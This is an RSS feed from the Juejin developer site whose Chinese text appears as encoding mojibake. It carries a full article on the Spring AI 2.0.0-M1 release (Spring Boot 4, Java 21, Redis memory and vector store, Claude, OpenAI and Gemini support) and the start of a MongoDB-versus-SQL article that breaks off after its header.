<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Spring AI 2.x å‘å¸ƒï¼šå…¨é¢æ‹¥æŠ± Java 21ï¼ŒRedis å²è¯—çº§å¢å¼ºï¼]]></title>    <link>https://juejin.cn/post/7583992239103410228</link>    <guid>https://juejin.cn/post/7583992239103410228</guid>    <pubDate>2025-12-16T06:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103410228" data-draft-id="7583973613198196751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring AI 2.x å‘å¸ƒï¼šå…¨é¢æ‹¥æŠ± Java 21ï¼ŒRedis å²è¯—çº§å¢å¼ºï¼"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-16T06:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaç¼–ç¨‹çˆ±å¥½è€…"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring AI 2.x å‘å¸ƒï¼šå…¨é¢æ‹¥æŠ± Java 21ï¼ŒRedis å²è¯—çº§å¢å¼ºï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaç¼–ç¨‹çˆ±å¥½è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:26:20.000Z" title="Tue Dec 16 2025 06:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Spring AI å›¢é˜Ÿåˆšåˆšå‘å¸ƒäº†Â <strong>Spring AI 2.0.0-M1</strong>ã€‚è¿™ä¸ä»…æ˜¯ä¸€æ¬¡å¸¸è§„çš„ç‰ˆæœ¬è¿­ä»£ï¼Œæ›´æ˜¯ 2.x ç³»åˆ—çš„æ­£å¼å¼€ç¯‡ï¼š<strong>æŠ€æœ¯æ ˆã€åŸºçº¿ç‰ˆæœ¬ã€æ¨¡å‹ç”Ÿæ€å‡ ä¹ç»å†äº†ä¸€è½®â€œå¤§æ¢è¡€â€ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feac104b70b4437d984458ed3db86032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=MLMJ2XscSs6CHnRUP3X28qVnuVg%3D" alt="" loading="lazy"/></p>
<p>åœ¨æ­¤ä¹‹å‰ï¼ŒSpring AI 1.1 æ­£å¼ç‰ˆäºä¸Šæœˆå‘å¸ƒï¼Œå¸¦æ¥äº† MCP å¼€ç®±å³ç”¨ã€Prompt ç¼“å­˜ã€è‡ªè¿›åŒ–æ™ºèƒ½ä½“ç­‰ç‰¹æ€§ã€‚</p>
<p>æœ¬æ¬¡é‡Œç¨‹ç¢‘ç‰ˆæœ¬åŸºäºÂ <strong>Spring Boot 4.0 GA</strong>Â å’ŒÂ <strong>Spring Framework 7.0</strong>Â æ„å»ºï¼Œä»¥Â <strong>Jakarta EE 11</strong>Â ä¸ºåŸºçŸ³ï¼Œå¹¶<strong>å¼ºåˆ¶è¦æ±‚ Java 21</strong>Â ä½œä¸ºæœ€ä½å¼€å‘ç¯å¢ƒã€‚</p>
<p>æ•´ä½“æ¥çœ‹ï¼ŒSpring AI 2.0.0-M1 ä¸€å…±åˆå…¥äº†Â <strong>67 é¡¹æ”¹åŠ¨</strong>ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>25 é¡¹åŠŸèƒ½å¢å¼º</strong>ï¼šå›´ç»• AI åŸç”Ÿå¼€å‘ä½“éªŒåšäº†å¤§å¹…æ‰©å±•ï¼›</li>
<li><strong>32 é¡¹æ–‡æ¡£æ›´æ–°</strong>ï¼šå¯¹æ–°æ‰‹æ›´å‹å¥½ï¼Œè¸©å‘å‰å¤šçœ‹ä¸€çœ¼èƒ½çœä¸å°‘æ—¶é—´ï¼›</li>
<li><strong>7 ä¸ªç¨³å®šæ€§ä¿®å¤ + 3 ä¸ªå®‰å…¨ä¾èµ–å‡çº§</strong>ï¼šæŠŠåŸºç¡€æ‰“å¾—æ›´ç¨³ã€‚</li>
</ul>
<p>ä¸‹é¢æŒ‰æ¨¡å—ç®€å•æ‹†ä¸€ä¸‹è¿™æ¬¡ç‰ˆæœ¬çš„å‡ ä¸ªå…³é”®å˜åŒ–ã€‚</p>
<h2 data-id="heading-0">åº•å±‚æ¶æ„å…¨é¢è·Ÿè¿›ï¼šSpring Boot 4 &amp; Framework 7</h2>
<p>è¿™æ˜¯ Spring AI 2.0 æœ€æ ¹æœ¬çš„å˜åŒ–ã€‚Spring AI å·²ç»ä» Spring Boot 3.x å…¨é¢è¿åˆ°Â <strong>Spring Boot 4.0 GA</strong>Â /Â <strong>Spring Framework 7.0</strong>ã€‚</p>
<p><strong>è¿™æ„å‘³ç€ï¼š</strong></p>
<ul>
<li>
<p><strong>çº¢åˆ©</strong>ï¼šä½ å¯ä»¥ç›´æ¥äº«å—åˆ°æ–°ä¸€ä»£æ¡†æ¶åœ¨Â <strong>è™šæ‹Ÿçº¿ç¨‹</strong>ã€<strong>AOT ç¼–è¯‘</strong>ã€<strong>æ€§èƒ½è°ƒä¼˜</strong>Â ç­‰æ–¹é¢çš„æ‰€æœ‰æ–°ç‰¹æ€§ã€‚</p>
</li>
<li>
<p><strong>æˆæœ¬</strong>ï¼šå¿…é¡»å°†è¿è¡Œç¯å¢ƒå‡çº§åˆ°Â <strong>Java 21</strong>ã€‚å¯¹äºè€é¡¹ç›®è€Œè¨€ï¼Œè¿™æ˜¯è¿ç§»å‰éœ€è¦é‡ç‚¹è¯„ä¼°çš„æˆæœ¬ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1f8f2c057b847fd9858b0609e823db8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=SfbNJBQvEOmbr1RKQ0V9fHg88ik%3D" alt="" loading="lazy"/></p>
<p>å¯¹åº”çš„ issue åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Fspring-projects%2Fspring-ai%2Fpull%2F4774" target="_blank" title="https://link.zhihu.com/?target=https%3A//github.com/spring-projects/spring-ai/pull/4774" ref="nofollow noopener noreferrer">github.com/spring-projâ€¦</a></p>
<p>Spring Boot 4.0 çš„æ–°ç‰¹æ€§æˆ‘ä¹Ÿå‘æ–‡ç« è¯¦ç»†ä»‹ç»è¿‡ï¼šSpring Boot 4.0 æ­£å¼å‘å¸ƒï¼Œäººå·²éº»ã€‚ã€‚ã€‚</p>
<h2 data-id="heading-1">Redis ç”Ÿæ€æ·±åŒ–ï¼šè®°å¿†èƒ½åŠ› + æ£€ç´¢èƒ½åŠ›åŒå‡çº§</h2>
<p>Redis åœ¨æœ¬æ¬¡æ›´æ–°ä¸­è·å¾—äº†å²è¯—çº§çš„å¢å¼ºï¼Œæˆä¸ºæ„å»ºä¼ä¸šçº§ AI åº”ç”¨çš„é¦–é€‰å­˜å‚¨æ–¹æ¡ˆä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-2">1.Redis Chat Memory å…¨æ–°å®ç°</h2>
<p>æ–°å¢äº†åŸºäº Redis çš„èŠå¤©è®°å¿†ç»„ä»¶ï¼ˆå« Spring Boot Starterï¼‰ï¼Œæ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p><strong>æŒä¹…åŒ–è®°å¿†</strong>ï¼šæ”¯æŒè·¨ä¼šè¯ä¿ç•™ä¸Šä¸‹æ–‡ï¼Œä¸å†ä¸¢å¤±ç”¨æˆ·å†å²ã€‚</p>
</li>
<li>
<p><strong>æ£€ç´¢å¢å¼º</strong>ï¼šæ”¯æŒæ–‡æœ¬æœç´¢ä¸èŒƒå›´æŸ¥è¯¢ã€‚</p>
</li>
<li>
<p><strong>æ€§èƒ½è°ƒä¼˜</strong>ï¼šé’ˆå¯¹å‘é‡æ£€ç´¢çš„Â <strong>HNSW ç´¢å¼•å‚æ•°</strong>ï¼ˆM, efConstruction, efRuntimeï¼‰å®Œå…¨å¼€æ”¾é…ç½®ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚ï¼Œåœ¨â€œå¬å›ç‡â€ä¸â€œæ—¶å»¶â€ä¹‹é—´åšç²¾ç»†å¹³è¡¡ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f90e921f95fd47dcb5111ae69e9e1959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=FQQBXF4L%2BWJK3HjZ6hTeu%2Bmrrmo%3D" alt="" loading="lazy"/></p>
<p>å¯¹åº”çš„æ–‡æ¡£åœ°å€:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.spring.io%2Fspring-ai%2Freference%2F2.0%2Fapi%2Fvectordbs%2Fredis.html" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.spring.io/spring-ai/reference/2.0/api/vectordbs/redis.html" ref="nofollow noopener noreferrer">docs.spring.io/spring-ai/râ€¦</a></p>
<h2 data-id="heading-3">2.Redis Vector Store å‡çº§</h2>
<p>å‘é‡å­˜å‚¨èƒ½åŠ›åŒæ­¥å‡çº§ï¼š</p>
<ul>
<li>æ–°å¢Â <strong>æ–‡æœ¬æœç´¢</strong>Â å’ŒÂ <strong>èŒƒå›´æŸ¥è¯¢</strong>Â èƒ½åŠ›ã€‚</li>
<li>åŒæ ·æš´éœ² HNSW ç›¸å…³å‚æ•°ï¼Œæ–¹ä¾¿è¿›è¡Œç»†ç²’åº¦çš„æ€§èƒ½æƒè¡¡ã€‚</li>
</ul>
<p>Maven ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-redis-store<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0-M1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>å¦‚æœä½ çš„æŠ€æœ¯æ ˆé‡Œå·²ç»æœ‰äº† Redisï¼Œå¼•å…¥è¿™ä¸ªä¾èµ–å¯ä»¥è®©ä½ æ— éœ€é¢å¤–éƒ¨ç½²ä¸“é—¨çš„å‘é‡æ•°æ®åº“ï¼ˆå¦‚ Milvusã€Chromaï¼‰æˆ–è®°å¿†å­˜å‚¨ç»„ä»¶ï¼Œç›´æ¥åˆ©ç”¨ç°æœ‰çš„ Redis åŸºç¡€è®¾æ–½å°±èƒ½æ„å»ºç”Ÿäº§çº§çš„ AI åº”ç”¨ã€‚</p>
<h2 data-id="heading-4">æ¨¡å‹èƒ½åŠ›çš„å…¨é¢çˆ†å‘ï¼šClaude, OpenAI ä¸ Gemini</h2>
<p>åœ¨å¤§æ¨¡å‹æ¥å…¥å±‚ï¼Œè¿™æ¬¡çš„æ›´æ–°ä¹Ÿç›¸å½“å¯†é›†ã€‚</p>
<ul>
<li><strong>Anthropic Claudeï¼šä¸€å£æ°”ä¸Šåˆ° 4.5</strong></li>
<li>
<ul>
<li>æ–°å¢å¯¹Â <strong>Claude 4.5 Opus / Haiku</strong>Â çš„æ”¯æŒï¼›</li>
<li>å¼•å…¥Â <strong>Citations API</strong>ï¼šå¯ä»¥åœ¨å›ç­”ä¸­ç²¾ç¡®æ ‡æ³¨æ¥æºæ–‡æ¡£çš„å…·ä½“ç‰‡æ®µï¼ˆPDFã€çº¯æ–‡æœ¬ç­‰ï¼‰ï¼Œå¯¹ RAGã€é—®ç­”ç±»åœºæ™¯éå¸¸æœ‰ç”¨ï¼Œç›®å‰æ”¯æŒ Claude 3.7 Sonnet å’Œ Claude 4 ç³»åˆ—ï¼›</li>
<li>é›†æˆÂ <strong>Files API</strong>ï¼šæ¨¡å‹å¯ä»¥ç›´æ¥ç”Ÿæˆå¯ä¸‹è½½æ–‡ä»¶ï¼ˆä»£ç ã€æŠ¥å‘Šç­‰ï¼‰ï¼Œæ›´é€‚åˆåš Agent / å·¥å…·å‹åº”ç”¨ï¼›</li>
<li>å·¥å…·è°ƒç”¨èƒ½åŠ›æ–°å¢ Auto / Any / Tool / None å››ç§æ¨¡å¼ï¼Œæ–¹ä¾¿ç²¾ç»†æ§åˆ¶â€œæ¨¡å‹ä½•æ—¶ã€å¦‚ä½•ç”¨å·¥å…·â€ã€‚</li>
</ul>
</li>
<li><strong>OpenAIï¼šå®˜æ–¹ Java SDK åŸç”Ÿæ¥å…¥</strong></li>
<li>
<ul>
<li>
<p>Spring AI ç°åœ¨ç›´æ¥é›†æˆäº†Â <strong>OpenAI å®˜æ–¹ Java SDK</strong>ã€‚</p>
</li>
<li>
<p>é»˜è®¤èŠå¤©æ¨¡å‹ä¹Ÿæ›´æ–°ä¸ºå½“å‰å‰æ²¿çš„ gpt-5-miniï¼Œå¼€ç®±å³ç”¨çš„æ•ˆæœä¼šæ¯”è€ç‰ˆæœ¬å¥½ä¸å°‘ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d114630c811437994f9fffae4cdc7d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=EcC%2FSwDKQsbnsxYhNMlgCpneMCU%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Google Geminiï¼šæ€è€ƒæ·±åº¦å¯è°ƒï¼š</strong> Google GenAI SDK å‡çº§åˆ°Â <strong>1.30.0</strong>ï¼Œå¹¶ä¸º Gemini æ¨¡å‹è¡¥ä¸Šäº† ThinkingConfig / ThinkingLevel é…ç½®ã€‚ç®€å•ç†è§£ï¼šå¯ä»¥é€šè¿‡é…ç½®é¡¹æ¥æ§åˆ¶â€œæ¨¡å‹æƒ³å¤šæ·±â€ï¼Œåœ¨æ¨ç†è´¨é‡å’Œå“åº”æ—¶å»¶ä¹‹é—´æ‰¾åˆ°æ›´åˆé€‚çš„å¹³è¡¡ç‚¹ã€‚</li>
</ul>
<h2 data-id="heading-5">ä¼ä¸šçº§ç‰¹æ€§ä¸åŸºç¡€è®¾æ–½æ‰©å±•</h2>
<p>é™¤äº†æ¨¡å‹å’Œå­˜å‚¨ï¼Œè¿™æ¬¡åœ¨åŸºç¡€è®¾æ–½ä¾§ä¹Ÿåšäº†å‡ å¤„é’ˆå¯¹ä¼ä¸šåœºæ™¯çš„è¡¥å¼ºï¼š</p>
<ul>
<li><strong>Azure Cosmos DB Chat Memoryï¼š</strong> æ–°å¢äº†å¯¹åº”çš„ Spring Boot Starterï¼ŒAzure ç”Ÿæ€çš„åŒå­¦å¯ä»¥ç›´æ¥æŠŠèŠå¤©è®°å½•è½åœ¨ Cosmos DB é‡Œï¼Œå°‘å†™ä¸å°‘æ ·æ¿ä»£ç ã€‚</li>
<li><strong>Model Context Protocolï¼ˆMCPï¼‰å¢å¼ºï¼š</strong> ä¼˜åŒ–äº† MCP å®¢æˆ·ç«¯çš„è‡ªåŠ¨é…ç½®æµç¨‹ï¼Œå¼•å…¥å¯é€‰çš„å¤„ç†å™¨æ³¨å†Œè¡¨ï¼Œå¹¶æ”¹å–„äº†å¯¹å¤æ‚ Bean ç±»å‹çš„æ”¯æŒï¼Œè®© MCP èƒ½æ›´è‡ªç„¶åœ°èå…¥ç°æœ‰ Spring åº”ç”¨ã€‚</li>
<li><strong>GemFire å‘é‡å­˜å‚¨å®‰å…¨åŠ å›º:</strong> Â GemFire Vector Store ç°åœ¨æ”¯æŒÂ <strong>ç”¨æˆ·å / å¯†ç è®¤è¯</strong>ï¼Œå¯¹æœ‰åˆè§„è¦æ±‚çš„ä¼ä¸šç¯å¢ƒæ›´å‹å¥½ã€‚</li>
</ul>
<h2 data-id="heading-6">æ€»ç»“</h2>
<p>ä¸‹é¢æ˜¯Â <strong>Spring AI 2.0.0-M1</strong>Â å¸¦æ¥çš„å…³é”®å‡çº§ï¼š</p>
<ol>
<li><strong>åŸºåº§å‡çº§</strong>ï¼šå…¨é¢åŸºäºÂ <strong>Spring Boot 4.0 GA</strong>Â å’ŒÂ <strong>Spring Framework 7.0</strong>Â æ„å»ºï¼Œ<strong>å¼ºåˆ¶è¦æ±‚ Java 21</strong>ã€‚</li>
<li><strong>Redis å²è¯—çº§å¢å¼º</strong>ï¼šæ–°å¢ Redis Chat Memoryï¼ˆæ”¯æŒæŒä¹…åŒ–ã€æœç´¢ï¼‰ï¼Œå‘é‡å­˜å‚¨æ”¯æŒæ–‡æœ¬æœç´¢ä¸ HNSW å‚æ•°è°ƒä¼˜ï¼Œç¡®ç«‹äº† Redis åœ¨ Spring AI ç”Ÿæ€ä¸­ RAG/è®°å¿†ç³»ç»Ÿçš„é¦–é€‰æ–¹æ¡ˆä¹‹ä¸€ã€‚</li>
<li><strong>æ¨¡å‹ç”Ÿæ€çˆ†å‘</strong>ï¼š</li>
<li><strong>Anthropic</strong>ï¼šæ”¯æŒ Claude 4.5ï¼Œæ–°å¢ Citations APIï¼ˆå¼•ç”¨æº¯æºï¼‰å’Œ Files APIï¼ˆç”Ÿæˆæ–‡ä»¶ï¼‰ã€‚</li>
<li><strong>OpenAI</strong>ï¼šé›†æˆå®˜æ–¹ Java SDKï¼Œé»˜è®¤æ¨¡å‹æ›´æ–°ä¸º gpt-5-miniã€‚</li>
<li><strong>Google</strong>ï¼šGemini æ”¯æŒæ€è€ƒæ·±åº¦ï¼ˆThinkingLevelï¼‰é…ç½®ã€‚</li>
<li><strong>ä¼ä¸šçº§ç‰¹æ€§</strong>ï¼šæ–°å¢ Azure Cosmos DB èŠå¤©è®°å¿†ï¼Œå¢å¼º MCP å®¢æˆ·ç«¯é…ç½®ï¼ŒGemFire æ”¯æŒå®‰å…¨è®¤è¯ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MongoDBæ·±å…¥ä¸å®æˆ˜ï¼šåŸºäºSQLçš„å¯¹ç…§è§£æ]]></title>    <link>https://juejin.cn/post/7583992239103590452</link>    <guid>https://juejin.cn/post/7583992239103590452</guid>    <pubDate>2025-12-16T06:44:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103590452" data-draft-id="7584043969686683700" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MongoDBæ·±å…¥ä¸å®æˆ˜ï¼šåŸºäºSQLçš„å¯¹ç…§è§£æ"/> <meta itemprop="keywords" content="é¢è¯•,åç«¯"/> <meta itemprop="datePublished" content="2025-12-16T06:44:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æ©™ç¼–ç æ—¥å¿—"/> <meta itemprop="url" content="https://juejin.cn/user/3562867149506392"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MongoDBæ·±å…¥ä¸å®æˆ˜ï¼šåŸºäºSQLçš„å¯¹ç…§è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3562867149506392/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æ©™ç¼–ç æ—¥å¿—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:44:32.000Z" title="Tue Dec 16 2025 06:44:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
